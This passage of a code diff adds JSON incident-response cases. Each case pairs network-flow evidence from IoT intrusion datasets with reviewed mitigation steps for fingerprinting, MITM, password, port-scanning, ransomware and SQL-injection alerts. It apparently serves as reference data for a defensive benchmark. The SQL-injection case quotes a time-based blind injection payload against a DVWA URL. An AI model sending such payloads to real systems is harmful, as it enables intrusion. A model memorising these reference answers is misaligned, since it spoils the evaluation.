+          "base": "bloquear la causa confirmada y corregir el fallo que permite agotar recursos",
+          "item_index": 2,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "eradication",
+          "reference_context": "No bloquear 192.168.100.148 como causa confirmada por un solo flujo; correlacionar el estado INT con el servicio y corregir únicamente fallos verificados.",
+          "reference_id": "case-mitlive-15-32fa99ad::mitigation::02"
+        },
+        {
+          "base": "configurar cuotas, timeouts, watchdogs y mecanismos de backpressure",
+          "item_index": 3,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Configurar cuotas, timeouts, watchdogs y backpressure para el servicio UDP de 192.168.100.6:80 usando métricas de capacidad además de los 8 paquetes observados.",
+          "reference_id": "case-mitlive-15-32fa99ad::mitigation::03"
+        },
+        {
+          "base": "probar recuperacion y capacidad del servicio frente a agotamiento sostenido",
+          "item_index": 4,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Probar la recuperación y capacidad de 192.168.100.6:80 ante carga UDP sostenida, sin interpretar este flujo de 480 bytes como agotamiento demostrado.",
+          "reference_id": "case-mitlive-15-32fa99ad::mitigation::04"
+        },
+        {
+          "base": "capturar ventana de flujo para evidencia",
+          "item_index": 5,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Capturar una ventana alrededor del evento 1076895 en ambos sentidos para verificar el estado INT, los 8 paquetes y los 480 bytes registrados.",
+          "reference_id": "case-mitlive-15-32fa99ad::mitigation::05"
+        },
+        {
+          "base": "revisar politica de red del segmento",
+          "item_index": 6,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Revisar si la política del segmento autoriza UDP desde 192.168.100.148:51647 hacia 192.168.100.6:80 y ajustar solo reglas justificadas.",
+          "reference_id": "case-mitlive-15-32fa99ad::mitigation::06"
+        }
+      ]
+    },
+    {
+      "attack_type": "Fingerprinting",
+      "case_id": "case-mitlive-06-6940c994",
+      "dataset_origin": "edge_iiotset",
+      "evidence": {
+        "anomaly_summary": "Tráfico de red con múltiples protocolos (ARP, ICMP, HTTP, MQTT) entre dos hosts locales. Presencia de flags TCP y campos de protocolos de aplicación sin contexto de flujo o métricas de host.",
+        "app_proto": "ARP, ICMP, HTTP, MQTT",
+        "dst_ip": "192.168.0.170",
+        "event_id": "evt_20211222_222216_056069_arp_icmp_http_mqtt",
+        "missing_fields": [
+          "src_port",
+          "dst_port",
+          "transport_proto",
+          "packet_count",
+          "byte_count",
+          "duration_ms"
+        ],
+        "modality": "network_flow",
+        "schema_profile": "network_packet",
+        "semantic_text": "Paquete de red capturado a las 22:22:16 UTC del 22/12/2021 entre 192.168.0.128 (origen) y 192.168.0.170 (destino). Contiene tráfico ARP (opcode no especificado), ICMP (checksum 51217), HTTP (método no especificado, URI no especificada) y MQTT (versión no especificada, topic no especificado). No se identifican puertos de origen/destino ni protocolo de transporte en el contexto de este paquete.",
+        "service_context": {
+          "arp": {
+            "dst_proto_ipv4": "arp.dst.proto_ipv4",
+            "hw_size": "arp.hw.size",
+            "opcode": "arp.opcode",
+            "src_proto_ipv4": "arp.src.proto_ipv4"
+          },
+          "http": {
+            "content_length": "http.content_length",
+            "file_data": "http.file_data",
+            "referer": "http.referer",
+            "request_full_uri": "http.request.full_uri",
+            "request_method": "http.request.method",
+            "request_uri_query": "http.request.uri.query",
+            "request_version": "http.request.version",
+            "response": "http.response",
+            "tls_port": "http.tls_port"
+          },
+          "icmp": {
+            "checksum": "icmp.checksum",
+            "seq_le": "icmp.seq_le",
+            "transmit_timestamp": "icmp.transmit_timestamp",
+            "unused": "icmp.unused"
+          },
+          "mbtcp": {
+            "len": "mbtcp.len",
+            "trans_id": "mbtcp.trans_id",
+            "unit_id": "mbtcp.unit_id"
+          },
+          "mqtt": {
+            "conack_flags": "mqtt.conack.flags",
+            "conflag_cleansess": "mqtt.conflag.cleansess",
+            "conflags": "mqtt.conflags",
+            "hdrflags": "mqtt.hdrflags",
+            "len": "mqtt.len",
+            "msg": "mqtt.msg",
+            "msg_decoded_as": "mqtt.msg_decoded_as",
+            "msgtype": "mqtt.msgtype",
+            "proto_len": "mqtt.proto_len",
+            "protoname": "mqtt.protoname",
+            "topic": "mqtt.topic",
+            "topic_len": "mqtt.topic_len",
+            "ver": "mqtt.ver"
+          }
+        },
+        "src_ip": "192.168.0.128"
+      },
+      "references": [
+        {
+          "base": "limitar o bloquear el origen que realiza fingerprinting repetitivo",
+          "item_index": 0,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Limitar el tráfico de 192.168.0.128 hacia 192.168.0.170 solo si capturas adicionales confirman un sondeo repetitivo; la evidencia actual describe un paquete.",
+          "reference_id": "case-mitlive-06-6940c994::mitigation::00"
+        },
+        {
+          "base": "segmentar temporalmente el activo cuya plataforma esta siendo identificada",
+          "item_index": 1,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Segmentar temporalmente 192.168.0.170 solo si se confirma que el tráfico multiprotocolo observado intenta identificar su plataforma.",
+          "reference_id": "case-mitlive-06-6940c994::mitigation::01"
+        },
+        {
+          "base": "revisar y retirar banners, respuestas y servicios que revelen informacion innecesaria",
+          "item_index": 2,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "eradication",
+          "reference_context": "Revisar en 192.168.0.170 las respuestas asociadas a ARP, ICMP, HTTP y MQTT y retirar únicamente la información innecesaria que se confirme expuesta.",
+          "reference_id": "case-mitlive-06-6940c994::mitigation::02"
+        },
+        {
+          "base": "reducir la exposicion de versiones y caracteristicas del sistema",
+          "item_index": 3,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Comprobar si 192.168.0.170 expone versiones o características mediante los protocolos observados y, solo si se confirma, reducir esa información; la muestra no aporta esos valores.",
+          "reference_id": "case-mitlive-06-6940c994::mitigation::03"
+        },
+        {
+          "base": "crear reglas IDS para secuencias de sondeo y huellas conocidas",
+          "item_index": 4,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Crear una regla IDS que correlacione tráfico ARP, ICMP, HTTP y MQTT de 192.168.0.128 hacia 192.168.0.170, sin inferir una secuencia a partir de este paquete.",
+          "reference_id": "case-mitlive-06-6940c994::mitigation::04"
+        },
+        {
+          "base": "capturar muestra de paquetes",
+          "item_index": 5,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Capturar paquetes adicionales entre 192.168.0.128 y 192.168.0.170 para completar los puertos, el transporte y el volumen ausentes.",
+          "reference_id": "case-mitlive-06-6940c994::mitigation::05"
+        },
+        {
+          "base": "inspeccionar anomalias de protocolo",
+          "item_index": 6,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Inspeccionar la coherencia de los campos ARP, ICMP, HTTP y MQTT observados, incluidos los valores de aplicación no especificados.",
+          "reference_id": "case-mitlive-06-6940c994::mitigation::06"
+        }
+      ]
+    },
+    {
+      "attack_type": "MITM",
+      "case_id": "case-mitlive-07-5e58a71e",
+      "dataset_origin": "ton_iot",
+      "evidence": {
+        "anomaly_summary": "Comunicación TCP/SSL desde red local a destino externo en puerto 443 con tráfico bidireccional asimétrico (924 bytes src vs 6325 bytes dst) y estado de conexión SF (successful finish).",
+        "app_proto": "ssl",
+        "byte_count": 8713,
+        "dst_ip": "13.35.146.99",
+        "dst_port": 443,
+        "duration_ms": 180233.542,
+        "event_id": "evt_20240612_192168001034_13035146099",
+        "missing_fields": [
+          "ts"
+        ],
+        "modality": "network_flow",
+        "packet_count": 50,
+        "schema_profile": "network_flow",
+        "semantic_text": "Tráfico de red desde 192.168.1.34:49842 hacia 13.35.146.99:443 usando TCP/SSL con 50 paquetes totales (28 src, 22 dst), 8713 bytes transferidos (2388 src, 7477 dst) y duración de 180.23 segundos. Estado de conexión SF. Posible actividad legítima o sospechosa de exfiltración de datos.",
+        "src_ip": "192.168.1.34",
+        "src_port": 49842,
+        "traffic_direction": "outbound",
+        "transport_proto": "tcp"
+      },
+      "references": [
+        {
+          "base": "aislar el segmento en el que se observa la intermediacion maliciosa",
+          "item_index": 0,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Aislar el segmento de 192.168.1.34 solo si la revisión del flujo SSL hacia 13.35.146.99:443 confirma intermediación; la evidencia actual no la demuestra.",
+          "reference_id": "case-mitlive-07-5e58a71e::mitigation::00"
+        },
+        {
+          "base": "forzar canales cifrados y detener temporalmente comunicaciones no autenticadas",
+          "item_index": 1,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Mantener cifrado el flujo de 192.168.1.34 a 13.35.146.99:443 y detenerlo únicamente si se confirma que carece de autenticación.",
+          "reference_id": "case-mitlive-07-5e58a71e::mitigation::01"
+        },
+        {
+          "base": "eliminar el nodo intruso y corregir entradas ARP o DNS manipuladas",
+          "item_index": 2,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "eradication",
+          "reference_context": "Comprobar los nodos y las tablas ARP o DNS vinculadas a ambos extremos antes de corregirlas, pues la muestra solo acredita un flujo TCP/SSL.",
+          "reference_id": "case-mitlive-07-5e58a71e::mitigation::02"
+        },
+        {
+          "base": "usar TLS con validacion estricta de certificados para la informacion sensible",
+          "item_index": 3,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Exigir validación estricta de certificados en las conexiones SSL/TLS de 192.168.1.34 hacia 13.35.146.99:443.",
+          "reference_id": "case-mitlive-07-5e58a71e::mitigation::03"
+        },
+        {
+          "base": "habilitar inspeccion ARP dinamica, DHCP snooping y segmentacion de red",
+          "item_index": 4,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Habilitar inspección ARP dinámica, DHCP snooping y segmentación para la red de 192.168.1.34, sin atribuir manipulación ARP o DHCP a este flujo.",
+          "reference_id": "case-mitlive-07-5e58a71e::mitigation::04"
+        },
+        {
+          "base": "capturar ventana de flujo para evidencia",
+          "item_index": 5,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Capturar una ventana ampliada del flujo entre 192.168.1.34:49842 y 13.35.146.99:443 para contextualizar sus 50 paquetes y 180,23 segundos.",
+          "reference_id": "case-mitlive-07-5e58a71e::mitigation::05"
+        },
+        {
+          "base": "revisar politica de red del segmento",
+          "item_index": 6,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Revisar la política de salida del segmento de 192.168.1.34 para conexiones TCP/SSL a destinos externos por el puerto 443.",
+          "reference_id": "case-mitlive-07-5e58a71e::mitigation::06"
+        }
+      ]
+    },
+    {
+      "attack_type": "Password",
+      "case_id": "case-mitlive-08-6da6e3d3",
+      "dataset_origin": "ton_iot",
+      "evidence": {
+        "anomaly_summary": "TCP flow to HTTP service with short duration, low source bytes, and higher destination bytes. Connection state indicates successful completion (SF).",
+        "app_proto": "http",
+        "byte_count": 1525,
+        "dst_ip": "192.168.1.195",
+        "dst_port": 80,
+        "duration_ms": 8.931,
+        "event_id": "evt_20240612_19216800131_19216800195_tcp_http_54554_80",
+        "missing_fields": [
+          "ts"
+        ],
+        "modality": "network_flow",
+        "packet_count": 9,
+        "schema_profile": "network_flow",
+        "semantic_text": "Network flow from 192.168.1.31:54554 to 192.168.1.195:80 over TCP with HTTP service. Transferred 155 bytes (source) and 978 bytes (destination) in 9 packets (5 source, 4 destination) over 8.931 ms. Connection state: SF (successful).",
+        "src_ip": "192.168.1.31",
+        "src_port": 54554,
+        "traffic_direction": "outbound",
+        "transport_proto": "tcp"
+      },
+      "references": [
+        {
+          "base": "aplicar bloqueo temporal o rate limiting tras intentos de autenticacion fallidos",
+          "item_index": 0,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Aplicar bloqueo temporal o rate limiting a 192.168.1.31 solo si registros adicionales confirman intentos de autenticación fallidos; el flujo HTTP observado terminó correctamente.",
+          "reference_id": "case-mitlive-08-6da6e3d3::mitigation::00"
+        },
+        {
+          "base": "bloquear el origen del ataque contra el servicio de autenticacion",
+          "item_index": 1,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Bloquear 192.168.1.31 frente a 192.168.1.195:80 únicamente si se confirma un ataque contra la autenticación, no demostrado por este flujo.",
+          "reference_id": "case-mitlive-08-6da6e3d3::mitigation::01"
+        },
+        {
+          "base": "rotar las credenciales afectadas e invalidar las sesiones activas asociadas",
+          "item_index": 2,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "eradication",
+          "reference_context": "Rotar credenciales e invalidar sesiones de 192.168.1.195 solo si registros complementarios identifican credenciales afectadas, dato ausente en la muestra.",
+          "reference_id": "case-mitlive-08-6da6e3d3::mitigation::02"
+        },
+        {
+          "base": "habilitar autenticacion multifactor donde el dispositivo o servicio lo permita",
+          "item_index": 3,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Habilitar autenticación multifactor en el servicio HTTP de 192.168.1.195 si dispone de acceso autenticado y lo permite; el flujo no muestra ese mecanismo.",
+          "reference_id": "case-mitlive-08-6da6e3d3::mitigation::03"
+        },
+        {
+          "base": "eliminar credenciales por defecto y aplicar una politica de contrasenas robustas",
+          "item_index": 4,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Revisar y eliminar credenciales por defecto del servicio HTTP de 192.168.1.195 y aplicar una política robusta, sin asumir que este flujo revela su uso.",
+          "reference_id": "case-mitlive-08-6da6e3d3::mitigation::04"
+        },
+        {
+          "base": "capturar ventana de flujo para evidencia",
+          "item_index": 5,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Capturar una ventana ampliada del flujo entre 192.168.1.31:54554 y 192.168.1.195:80 para obtener datos de autenticación ausentes en la muestra.",
+          "reference_id": "case-mitlive-08-6da6e3d3::mitigation::05"
+        },
+        {
+          "base": "revisar politica de red del segmento",
+          "item_index": 6,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Revisar la política que permite a 192.168.1.31 acceder a 192.168.1.195 mediante HTTP sobre TCP/80.",
+          "reference_id": "case-mitlive-08-6da6e3d3::mitigation::06"
+        }
+      ]
+    },
+    {
+      "attack_type": "Port_Scanning",
+      "case_id": "case-mitlive-09-b0ba0c52",
+      "dataset_origin": "edge_iiotset",
+      "evidence": {
+        "anomaly_summary": "TCP SYN packet from 192.168.0.170:1536 to 192.168.0.128:80 with TCP flags indicating SYN (2.0). No application payload or HTTP context provided in meaningful_values.",
+        "app_proto": "HTTP",
+        "dst_ip": "192.168.0.128",
+        "dst_port": 80,
+        "event_id": "evt_2021160558643554000_192.168.0.170_192.168.0.128_tcp80",
+        "modality": "network_flow",
+        "schema_profile": "network_packet",
+        "semantic_text": "TCP SYN packet detected from source IP 192.168.0.170 (port 1536) to destination IP 192.168.0.128 (port 80). TCP checksum: 27940.0. ACK value: 1608886436.0. No HTTP request or response data included in meaningful values.",
+        "src_ip": "192.168.0.170",
+        "src_port": 1536,
+        "traffic_direction": "outbound",
+        "transport_proto": "TCP"
+      },
+      "references": [
+        {
+          "base": "bloquear o limitar el origen que recorre puertos de forma automatizada",
+          "item_index": 0,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Limitar los SYN de 192.168.0.170 hacia 192.168.0.128 solo si más tráfico confirma un recorrido automatizado de puertos; esta muestra contiene únicamente TCP/80.",
+          "reference_id": "case-mitlive-09-b0ba0c52::mitigation::00"
+        },
+        {
+          "base": "aislar el segmento escaneado si el reconocimiento precede a intentos de explotacion",
+          "item_index": 1,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Aislar el segmento de 192.168.0.128 únicamente si aparecen intentos de explotación posteriores; el paquete observado solo inicia TCP/80.",
+          "reference_id": "case-mitlive-09-b0ba0c52::mitigation::01"
+        },
+        {
+          "base": "cerrar puertos y servicios expuestos que no sean necesarios para la operacion",
+          "item_index": 2,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "eradication",
+          "reference_context": "Verificar si TCP/80 en 192.168.0.128 es necesario y cerrarlo solo si no lo exige la operación.",
+          "reference_id": "case-mitlive-09-b0ba0c52::mitigation::02"
+        },
+        {
+          "base": "aplicar listas de control que permitan solo los puertos y origenes autorizados",
+          "item_index": 3,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Permitir TCP/80 en 192.168.0.128 solo desde orígenes autorizados, revisando específicamente el acceso de 192.168.0.170.",
+          "reference_id": "case-mitlive-09-b0ba0c52::mitigation::03"
+        },
+        {
+          "base": "configurar IDS o IPS para detectar barridos horizontales y verticales",
+          "item_index": 4,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Configurar IDS o IPS para correlacionar SYN de 192.168.0.170 hacia varios puertos o hosts, sin clasificar este único SYN como barrido.",
+          "reference_id": "case-mitlive-09-b0ba0c52::mitigation::04"
+        },
+        {
+          "base": "capturar muestra de paquetes",
+          "item_index": 5,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Capturar paquetes adicionales alrededor del SYN de 192.168.0.170:1536 a 192.168.0.128:80 para buscar otros destinos y respuestas.",
+          "reference_id": "case-mitlive-09-b0ba0c52::mitigation::05"
+        },
+        {
+          "base": "inspeccionar anomalias de protocolo",
+          "item_index": 6,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Inspeccionar el SYN TCP/80 y la ausencia de contenido HTTP antes de atribuir una anomalía de protocolo.",
+          "reference_id": "case-mitlive-09-b0ba0c52::mitigation::06"
+        }
+      ]
+    },
+    {
+      "attack_type": "Ransomware",
+      "case_id": "case-mitlive-10-9e17e2c6",
+      "dataset_origin": "ton_iot",
+      "evidence": {
+        "anomaly_summary": "TCP/SMB flujo de red con estado OTH (other) y 1 paquete de 60 bytes hacia puerto 445 (SMB).",
+        "app_proto": "smb",
+        "byte_count": 60,
+        "dst_ip": "192.168.1.193",
+        "dst_port": 445,
+        "event_id": "evt_20240612_192168001037_192168001193_tcp445",
+        "missing_fields": [
+          "ts",
+          "duration_ms"
+        ],
+        "modality": "network_flow",
+        "packet_count": 1,
+        "schema_profile": "network_flow",
+        "semantic_text": "Tráfico TCP desde 192.168.1.37:37887 hacia 192.168.1.193:445 (SMB) con estado de conexión 'OTH' y 1 paquete de 60 bytes. No se observan datos DNS, SSL o HTTP relevantes en esta muestra.",
+        "service_context": {
+          "service": "smb"
+        },
+        "src_ip": "192.168.1.37",
+        "src_port": 37887,
+        "traffic_direction": "outbound",
+        "transport_proto": "tcp"
+      },
+      "references": [
+        {
+          "base": "aislar inmediatamente el equipo afectado para detener la propagacion",
+          "item_index": 0,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Aislar el extremo que resulte afectado entre 192.168.1.37 y 192.168.1.193 únicamente si el análisis adicional confirma actividad de ransomware; la muestra solo contiene un paquete SMB de 60 bytes.",
+          "reference_id": "case-mitlive-10-9e17e2c6::mitigation::00"
+        },
+        {
+          "base": "desconectar recursos compartidos y almacenamiento accesible desde el equipo",
+          "item_index": 1,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Restringir temporalmente el acceso SMB entre 192.168.1.37 y 192.168.1.193 solo si se confirma riesgo, sin inferir propagación a partir del único paquete.",
+          "reference_id": "case-mitlive-10-9e17e2c6::mitigation::01"
+        },
+        {
+          "base": "preservar evidencias y reconstruir el sistema desde una imagen limpia verificada",
+          "item_index": 2,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "eradication",
+          "reference_context": "Preservar la muestra y reconstruir un sistema desde una imagen limpia solo si evidencia de host posterior confirma afectación; el flujo no identifica un equipo comprometido.",
+          "reference_id": "case-mitlive-10-9e17e2c6::mitigation::02"
+        },
+        {
+          "base": "mantener copias de seguridad desconectadas y probar periodicamente su restauracion",
+          "item_index": 3,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Mantener copias desconectadas y probar su restauración para los datos que 192.168.1.193 comparta por SMB, si se confirma que el servicio observado expone almacenamiento.",
+          "reference_id": "case-mitlive-10-9e17e2c6::mitigation::03"
+        },
+        {
+          "base": "reducir privilegios y mantener actualizados firmware, sistema y aplicaciones",
+          "item_index": 4,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Reducir privilegios de acceso SMB y mantener actualizados 192.168.1.37 y 192.168.1.193, priorizando la revisión del servicio TCP/445 observado.",
+          "reference_id": "case-mitlive-10-9e17e2c6::mitigation::04"
+        },
+        {
+          "base": "capturar ventana de flujo para evidencia",
+          "item_index": 5,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Capturar una ventana ampliada del flujo de 192.168.1.37:37887 a 192.168.1.193:445 para contextualizar el estado OTH y el paquete de 60 bytes.",
+          "reference_id": "case-mitlive-10-9e17e2c6::mitigation::05"
+        },
+        {
+          "base": "revisar politica de red del segmento",
+          "item_index": 6,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Revisar la política que permite el acceso de 192.168.1.37 a 192.168.1.193 por TCP/445 y limitarlo a necesidades operativas.",
+          "reference_id": "case-mitlive-10-9e17e2c6::mitigation::06"
+        }
+      ]
+    },
+    {
+      "attack_type": "SQL_injection",
+      "case_id": "case-mitlive-11-65a56c45",
+      "dataset_origin": "edge_iiotset",
+      "evidence": {
+        "anomaly_summary": "HTTP GET request with SQL injection payload in URI query targeting a local DVWA instance, indicating potential blind SQL injection attempt.",
+        "app_proto": "HTTP",
+        "byte_count": 383,
+        "dst_ip": "192.168.0.128",
+        "dst_port": 80,
+        "event_id": "evt_20211221_214140_778196",
+        "missing_fields": [
+          "packet_count",
+          "duration_ms"
+        ],
+        "modality": "network_flow",
+        "schema_profile": "network_flow",
+        "semantic_text": "Outbound TCP flow from 192.168.0.170:43564 to 192.168.0.128:80 (HTTP) carrying a GET request with a SQL injection payload in the URI query parameter. Payload includes 'SLEEP(5)' and conditional logic, suggesting an automated blind SQL injection attack against a DVWA (Damn Vulnerable Web Application) endpoint.",
+        "service_context": {
+          "http": {
+            "full_uri": "http://192.168.0.128/DVWA/vulnerabilities/sqli_blind/?id=8%29%20AND%20%28SELECT%201633%20FROM%20%28SELECT%28SLEEP%285%29%29%29XgLA%29%20AND%20%281274%3D1274&Submit=Submitid=58",
+            "method": "GET",
+            "uri_query": "id=8%29%20AND%20%28SELECT%201633%20FROM%20%28SELECT%28SLEEP%285%29%29%29XgLA%29%20AND%20%281274%3D1274&Submit=Submitid=58",
+            "version": "HTTP/1.1"
+          }
+        },
+        "src_ip": "192.168.0.170",
+        "src_port": 43564,
+        "traffic_direction": "outbound",
+        "transport_proto": "TCP"
+      },
+      "references": [
+        {
+          "base": "bloquear el payload y el origen observados mediante WAF o reglas equivalentes",
+          "item_index": 0,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Aplicar la regla al GET de 192.168.0.170 hacia 192.168.0.128:80 que contiene SLEEP(5) y lógica condicional en el parámetro id.",
+          "reference_id": "case-mitlive-11-65a56c45::mitigation::00"
+        },
+        {
+          "base": "retirar temporalmente el endpoint vulnerable si no puede protegerse de inmediato",
+          "item_index": 1,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Retirar temporalmente /DVWA/vulnerabilities/sqli_blind/ solo si no puede filtrarse de inmediato el patrón observado.",
